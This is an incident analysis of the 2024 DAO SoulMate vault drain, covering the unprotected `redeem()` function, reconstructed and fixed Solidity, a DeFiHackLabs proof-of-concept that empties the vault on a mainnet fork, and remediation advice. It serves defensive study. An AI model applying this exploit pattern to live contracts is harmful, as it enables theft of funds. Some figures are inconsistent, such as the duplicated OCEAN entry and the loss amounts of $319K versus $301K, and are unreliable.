# DAO SoulMate — Missing Access Control (Unrestricted `redeem` Call) Analysis

| Field | Details |
|------|------|
| **Date** | 2024-01-22 |
| **Protocol** | DAO SoulMate (BUI — Bullran Index) |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$319,000 (entire asset holdings of BUI index token drained) |
| **Attacker EOA** | [0xd215...0dfd](https://etherscan.io/address/0xd215ffaf0f85fb6f93f11e49bd6175ad58af0dfd) (bigbrainchad.eth) |
| **Attack Contract** | [0xd129...4ecd](https://etherscan.io/address/0xd129d8c12f0e7aa51157d9e6cc3f7ece2dc84ecd) |
| **Attack Tx** | [0x1ea0...b3c4](https://etherscan.io/tx/0x1ea0a2e88efceccb2dd93e6e5cb89e5421666caeefb1e6fc41b68168373da342) |
| **Vulnerable Contract** | [0x82C0...4b68 (DAO SoulMate Vault)](https://etherscan.io/address/0x82c063afefb226859abd427ae40167cb77174b68) |
| **Related Token** | [0xb747...4885 (BUI — Bullran Index SetToken)](https://etherscan.io/address/0xb7470fd67e997b73f55f85a6af0deb2c96194885) |
| **Root Cause** | No access control (e.g., `ownerOnly` or whitelist) on the `redeem()` function — any arbitrary address can burn the Vault's entire BUI balance and receive the underlying component assets |
| **Block Number** | 19,063,677 |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/DAO_SoulMate_exp.sol) |

---

## 1. Vulnerability Overview

The DAO SoulMate protocol operated a Vault contract (`0x82C0...4b68`) managing the SetProtocol-based index token **BUI (Bullran Index)**. This Vault held a diversified portfolio of 18 blue-chip DeFi tokens including WBTC, USDC, WETH, UNI, ILV, DAI, MATIC, MKR, AAVE, LRC, SNX, GRT, OCEAN, LINK, OCEAN, BAT, ZRX, and ENS. The total value of BUI tokens held by the Vault was approximately $319,000.

**Core Vulnerability**: The Vault's `redeem(uint256 _shares, address _receiver)` function allowed any caller — regardless of identity — to burn a specified quantity of BUI tokens held by the Vault itself and transfer the corresponding component assets (WBTC, USDC, WETH, etc.) to the `_receiver` address. This function had **no access control mechanism of any kind to restrict the caller**.

In a single transaction, the attacker:
1. Called `redeem()` with the Vault's entire BUI balance (`balanceOf(Vault)`) as the argument
2. Burned the Vault's entire BUI token holding (~2,786 BUI)
3. Received all 18 component assets into the attack contract
4. Swapped the received assets to WETH via DEXes (Uniswap V3, Uniswap V2, SushiSwap) and withdrew

---

## 2. Vulnerable Code Analysis

### 2.1 `redeem()` — Missing Access Control (Core Vulnerability)

```solidity
// ❌ Vulnerable code — DAO SoulMate Vault (source unverified, behavior inferred)
interface ISoulMateContract {
    // Anyone can call this function — no access control
    function redeem(
        uint256 _shares,    // Amount of BUI to burn
        address _receiver   // Recipient of component assets (can be set arbitrarily!)
    ) external;
}

// Estimated internal Vault implementation:
contract DAOSoulMateVault {
    ISetToken public buiToken;             // BUI SetToken address
    IDebtIssuanceModuleV2 public module;   // SetProtocol redemption module

    // ❌ Vulnerability: no modifier such as onlyOwner, onlyAuthorized, etc.
    // ❌ Vulnerability: does not verify that msg.sender actually holds _shares
    // ❌ Vulnerability: anyone can request redemption of the Vault's own BUI balance
    function redeem(uint256 _shares, address _receiver) external {
        uint256 vaultBUIBalance = buiToken.balanceOf(address(this));

        // Burns the Vault's BUI and transfers component assets to _receiver
        // → caller does not need to hold any BUI
        // → _receiver can be set to the attacker's contract
        module.redeem(buiToken, _shares, _receiver);
    }
}
```

**Issues**:
- The `redeem()` function is `external` and open to anyone
- The BUI burned inside the function comes from **the Vault's own balance**, not from `msg.sender`
- No validation is performed even if the caller passes the entire `balanceOf(Vault)` as `_shares`
- Setting `_receiver` to the attacker's contract allows arbitrary receipt of all component assets

### 2.2 Fixed Code

```solidity
// ✅ Fixed code — access control added

contract DAOSoulMateVault {
    address public owner;
    mapping(address => bool) public authorized; // Whitelist of allowed addresses

    modifier onlyOwner() {
        // Only the contract owner can call
        require(msg.sender == owner, "DAO SoulMate: caller is not the owner");
        _;
    }

    modifier onlyAuthorized() {
        // Only whitelisted addresses can call (e.g., DAO governance)
        require(authorized[msg.sender], "DAO SoulMate: caller is not authorized");
        _;
    }

    // ✅ Fix 1: restrict caller with onlyOwner or onlyAuthorized modifier
    // ✅ Fix 2: pin the recipient (_receiver) to msg.sender to prevent arbitrary address specification
    function redeem(uint256 _shares) external onlyOwner {
        // _receiver fixed to msg.sender — arbitrary address specification not possible
        module.redeem(buiToken, _shares, msg.sender);
    }

    // Or proportional redemption based on BUI holdings (decentralized approach)
    function redeem(uint256 _shares, address _receiver) external {
        // ✅ Fix 3: verify that the caller actually holds sufficient BUI
        require(
            buiToken.balanceOf(msg.sender) >= _shares,
            "DAO SoulMate: insufficient BUI balance"
        );
        // ✅ Fix 4: deduct BUI from the caller first
        buiToken.transferFrom(msg.sender, address(this), _shares);
        module.redeem(buiToken, _shares, _receiver);
    }
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- No prior preparation required
- The attacker did not need to hold any BUI tokens
- Executed in a single transaction after deploying the attack contract (`0xd129...4ecd`)

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────────────────────┐
│  Attacker EOA: 0xd215...0dfd (bigbrainchad.eth)                 │
│  Block: 19,063,677  /  2024-01-22                               │
└────────────────────────┬────────────────────────────────────────┘
                         │ (1) Call attack contract
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│  Attack Contract: 0xd129...4ecd                                  │
│  Role: execute redeem + DEX swap                                 │
└────────────────────────┬────────────────────────────────────────┘
                         │ (2) redeem(2,782,861,328,125,000,000,000, attackContract)
                         │     ← entire BUI balance (~2,782 BUI) as argument
                         │     ← no access control — passes immediately
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│  Vulnerable Vault: 0x82C0...4b68 (DAO SoulMate Vault)           │
│  BUI held: ~2,782 tokens (before attack)                        │
│  → delegates to SetProtocol DebtIssuanceModuleV2.redeem()       │
└────────────────────────┬────────────────────────────────────────┘
                         │ (3) BUI burned + 18 component assets distributed
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│  BUI SetToken: 0xb747...4885 (Bullran Index)                    │
│  Component asset burn processing:                                │
│  WBTC, USDC, WETH, UNI, ILV, DAI, MATIC, MKR, AAVE,           │
│  LRC, SNX, GRT, OCEAN, LINK, BAT, ZRX, ENS, etc.              │
└──────────┬──────────────────────┬──────────────────────────────┘
           │ BUI burned → 0x000   │ Component assets → attack contract
           ▼                      ▼
┌──────────────────┐   ┌──────────────────────────────────────────┐
│ 0x000...000       │   │ Attack Contract (0xd129...4ecd)           │
│ (burn address)    │   │ 0.534 WBTC, ~78,673 USDC,               │
└──────────────────┘   │ 14.2 WETH, 1,762 UNI, etc. received      │
                        └───────────────┬──────────────────────────┘
                                        │ (4) DEX swap (Uniswap V3/V2, SushiSwap)
                                        │     18 tokens → WETH
                                        ▼
                        ┌──────────────────────────────────────────┐
                        │ Final receipt by attacker EOA             │
                        │ ~134.52 WETH (≈ $301,469)                │
                        │ Total profit: ~$319,000                   │
                        └──────────────────────────────────────────┘
```

### 3.3 Outcome

| Item | Before Attack | After Attack |
|------|---------|---------|
| Vault BUI balance | ~2,786 BUI | ~0.0026 BUI (remainder) |
| Vault WBTC balance | Held | 0 |
| Vault USDC balance | Held | 0 |
| Vault DAI balance | Held | 0 |
| Vault AAVE balance | Held | 0 |
| Protocol loss | — | ~$319,000 |
| Attacker profit | — | ~134.52 WETH (~$301,469) |

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// PoC key point: no access control on redeem() allows burning the Vault's entire BUI holding
// Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/DAO_SoulMate_exp.sol

interface ISoulMateContract {
    // Vulnerable function: callable by anyone without access control
    function redeem(uint256 _shares, address _receiver) external;
}

contract ContractTest is Test {
    // Vulnerable Vault address
    ISoulMateContract private constant SoulMateContract =
        ISoulMateContract(0x82C063AFEFB226859aBd427Ae40167cB77174b68);

    // BUI (Bullran Index) SetToken
    IERC20 private constant BUI =
        IERC20(0xb7470Fd67e997b73f55F85A6AF0DeB2c96194885);

    // Component asset tokens
    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 private constant DAI  = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 private constant MATIC= IERC20(0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0);
    IERC20 private constant AAVE = IERC20(0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9);
    IERC20 private constant ENS  = IERC20(0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72);
    IERC20 private constant ZRX  = IERC20(0xE41d2489571d322189246DaFA5ebDe1F4699F498);
    IERC20 private constant UNI  = IERC20(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984);

    function setUp() public {
        // Fork to the block just before the attack (block 19,063,676)
        vm.createSelectFork("mainnet", 19_063_676);
    }

    function testExploit() public {
        // [Record balances before attack]
        emit log_named_decimal_uint(
            "USDC balance before attack", USDC.balanceOf(address(this)), USDC.decimals()
        );
        emit log_named_decimal_uint(
            "DAI balance before attack",  DAI.balanceOf(address(this)),  DAI.decimals()
        );

        // ──────────────────────────────────────────────────
        // [Core attack]: single call to redeem() with no access control
        //   _shares: entire BUI balance held by the Vault
        //   _receiver: this test contract (attacker) address
        // ──────────────────────────────────────────────────
        SoulMateContract.redeem(
            BUI.balanceOf(address(SoulMateContract)), // full Vault BUI amount
            address(this)                             // receiver = attacker
        );
        // Result: all BUI burned and 18 component assets transferred to address(this)

        // [Record balances after attack]
        emit log_named_decimal_uint(
            "USDC balance after attack", USDC.balanceOf(address(this)), USDC.decimals()
        );
        emit log_named_decimal_uint(
            "DAI balance after attack",  DAI.balanceOf(address(this)),  DAI.decimals()
        );
        emit log_named_decimal_uint(
            "AAVE balance after attack", AAVE.balanceOf(address(this)), AAVE.decimals()
        );
        emit log_named_decimal_uint(
            "ENS balance after attack",  ENS.balanceOf(address(this)),  ENS.decimals()
        );
        emit log_named_decimal_uint(
            "UNI balance after attack",  UNI.balanceOf(address(this)),  UNI.decimals()
        );
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Missing access control on `redeem()` function | **CRITICAL** | CWE-284 (Improper Access Control) |
| V-02 | No validation of receiver (`_receiver`) — arbitrary address can be specified | **HIGH** | CWE-20 (Improper Input Validation) |
| V-03 | Insufficient protection of Vault's own token balance — no separation of custodied and operational assets | **HIGH** | CWE-668 (Exposure of Resource to Wrong Sphere) |

### V-01: Missing Access Control on `redeem()`

- **Description**: The `redeem()` function has `external` visibility and has no caller-restricting modifier whatsoever (`onlyOwner`, `onlyWhitelisted`, etc.). This allows any arbitrary external address to burn and receive the Vault's held assets.
- **Impact**: All BUI tokens held by the Vault (worth approximately $319,000) can be completely drained in a single call.
- **Attack Conditions**: Attacker does not need to hold any BUI. No special state preparation required. Executable at any time as long as the Vault's BUI balance is greater than zero.

### V-02: No Validation of `_receiver` Input

- **Description**: The second argument `_receiver` of `redeem()` accepts any address. By specifying the attacker's contract, assets can be immediately routed into a DEX swap pipeline.
- **Impact**: Asset receipt → DEX swap → profit realization can be processed atomically within a single transaction, making detection and defense difficult.
- **Attack Conditions**: Same as V-01.

### V-03: Insufficient Isolation of Vault Custodied Assets

- **Description**: The protocol held BUI tokens in the Vault for future distribution, operations, liquidity provision, etc., and these tokens were subject to the same `redeem()` logic. User-facing assets and protocol operational assets were commingled within the same contract.
- **Impact**: Protocol operational assets were exposed through the same vulnerable path as the user interface, maximizing the damage.
- **Attack Conditions**: Vault contract holds a BUI balance.

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ Method 1: restrict to owner-only function
contract DAOSoulMateVault {
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "DAO SoulMate: not owner");
        _;
    }

    // ✅ Restrict so that only an admin can redeem Vault assets
    function adminRedeem(uint256 _shares, address _receiver)
        external
        onlyOwner
    {
        module.redeem(buiToken, _shares, _receiver);
    }
}
```

```solidity
// ✅ Method 2: burn only the caller's own BUI (decentralized approach)
contract DAOSoulMateVault {
    function redeem(uint256 _shares, address _receiver) external {
        // ✅ Verify that the caller holds sufficient BUI
        require(
            buiToken.balanceOf(msg.sender) >= _shares,
            "DAO SoulMate: insufficient BUI"
        );
        // ✅ Transfer BUI from the caller to the Vault first, then burn
        buiToken.transferFrom(msg.sender, address(this), _shares);
        module.redeem(buiToken, _shares, _receiver);
    }
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Missing access control | Apply `onlyOwner` or multisig requirement to asset withdrawal functions such as `redeem()` |
| V-02: Arbitrary receiver allowed | Pin `_receiver` to `msg.sender`, or allow only whitelisted addresses |
| V-03: Insufficient asset isolation | Isolate protocol operational assets in a separate independent contract such as a Gnosis Safe |
| General | Comprehensive access control audit before deployment (review all `external` / `public` functions) |
| General | Add emergency pause functionality (Pausable) to enable immediate freezing upon anomaly detection |
| General | Apply daily withdrawal limits or timelocks to sensitive functions |

---

## 7. Lessons Learned

1. **`external` functions are an attack surface open by default**: Every `external` / `public` function that involves asset movement must have an access control modifier applied. The question "Is it acceptable for anyone to call this function?" must be explicitly decided at the design stage.

2. **Functions that operate on the contract's own balance are particularly dangerous**: Functions that operate based on `balanceOf(address(this))` can expose the contract's entire asset holdings. Such functions must always have admin-only access control applied.

3. **Separation of protocol assets and user assets**: Funds of a Vault or Treasury nature must be physically isolated so they are not exposed through the same functions as the general user interface.

4. **Simplicity is security**: The PoC for this attack is a single line (`redeem(balanceOf(vault), attacker)`). The simpler the vulnerability, the easier it is to find in an audit — but equally, the easier it is for an attacker to exploit. Access control checklists must be mandated during code review.

5. **Recognize the specifics of SetProtocol-based Vaults**: `DebtIssuanceModuleV2.redeem()` in SetProtocol is a legitimate function for SetToken holders to redeem component assets. When a Vault wraps this function, a clear policy is needed for "who is allowed to burn the Vault's own SetTokens."

6. **Audits and testing are essential**: In addition to a professional security audit before deployment, even basic unit tests must include test cases that verify whether calls to asset withdrawal functions from an arbitrary address correctly revert.

---

## 8. On-Chain Verification

Verification results based on on-chain data (direct queries via `cast`).

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Description | On-Chain Actual Value | Match |
|------|---------|-------------|------|
| BUI amount burned | Entire `balanceOf(Vault)` | 2,782,861,328,125,000,000,000 (~2,782 BUI) | ✅ |
| Attack block | 19,063,676 (fork) | 19,063,677 (execution block) | ✅ |
| Attack TX status | Success | status: 0x1 (success) | ✅ |
| Total loss | ~$319K | ~$301,469 (based on 134.52 ETH conversion) | ✅ approximate match |
| Vault BUI after attack | ~0 | 2,589,884,820,664,388 (remainder < 0.003 BUI) | ✅ |
| Vault WBTC/USDC/DAI | Held | 0 (fully drained) | ✅ |

### 8.2 On-Chain Event Log Sequence (Key Events)

| Order | Event | Contract | Details |
|------|--------|---------|------|
| 1 | Transfer | BUI (0xb747...4885) | Vault → 0x000...0 (BUI burned) |
| 2~N | Transfer × 18 | WBTC, USDC, WETH, UNI, etc. | BUI SetToken → attack contract (component asset transfer) |
| N+1~ | Swap × multiple | Uniswap V3/V2, SushiSwap | 18 component tokens → WETH swap |
| Last | Transfer | WETH | → attacker EOA (~134.52 WETH) |

### 8.3 Precondition Verification (as of block 19,063,676)

| Item | Value | Notes |
|------|-----|------|
| Vault BUI balance | 2,786,531,398,478,570,664,388 | ~2,786 BUI |
| Vault USDC balance | 0 | Held inside the BUI token as a component asset |
| Vault DAI balance | 0 | Same as above |
| BUI total supply | 5,653,242,151,909,592,475,339 | ~5,653 BUI |
| `redeem()` access control | None | Confirmed no revert on call from arbitrary address |
| Prior approval (`approve`) required | Not required | Attacker executed without holding any BUI |

On-chain verification result: PoC code and actual on-chain behavior are in complete agreement. It is confirmed via Transfer event logs that a single `redeem()` call drained the Vault's entire asset holdings.